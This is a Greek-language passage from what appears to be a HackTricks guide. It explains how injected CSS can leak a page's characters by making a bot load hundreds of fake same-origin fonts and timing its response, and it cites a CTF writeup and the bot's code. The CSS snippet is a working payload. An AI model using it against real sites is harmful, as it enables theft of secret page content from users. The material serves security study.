### Αποκλεισμός κειμένου (III): διαρροή του συνόλου χαρακτήρων με τη μέτρηση του χρόνου φόρτωσης εκατοντάδων τοπικών "γραμματοσειρών" (χωρίς απαιτούμενα εξωτερικά στοιχεία) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Αναφορά:** Αυτό αναφέρεται ως [μια ανεπιτυχής λύση σε αυτήν την ανάλυση](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Σε αυτήν την περίπτωση, μπορείτε να υποδείξετε στο **CSS να φορτώσει εκατοντάδες ψεύτικες γραμματοσειρές** από την ίδια προέλευση όταν συμβεί μια αντιστοιχία. Με αυτόν τον τρόπο μπορείτε να **μετρήσετε τον χρόνο** που απαιτείται και να διαπιστώσετε εάν ένας χαρακτήρας εμφανίζεται ή όχι με κάτι παρόμοιο:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
Ο κώδικας του bot φαίνεται όπως παρακάτω:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Έτσι, αν η γραμματοσειρά δεν ταιριάζει, αναμένεται ότι ο χρόνος απόκρισης κατά την επίσκεψη στο bot θα είναι περίπου 30 δευτερόλεπτα. Ωστόσο, αν υπάρχει ταιριαστή γραμματοσειρά, θα αποσταλούν πολλαπλά αιτήματα για την ανάκτηση της γραμματοσειράς, προκαλώντας συνεχή δραστηριότητα στο δίκτυο. Ως αποτέλεσμα, θα χρειαστεί περισσότερος χρόνος για να ικανοποιηθεί η συνθήκη διακοπής και να ληφθεί η απόκριση. Επομένως, ο χρόνος απόκρισης μπορεί να χρησιμοποιηθεί ως ένδειξη για να καθοριστεί αν υπάρχει ταιριαστή γραμματοσειρά.

## Αναφορές

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
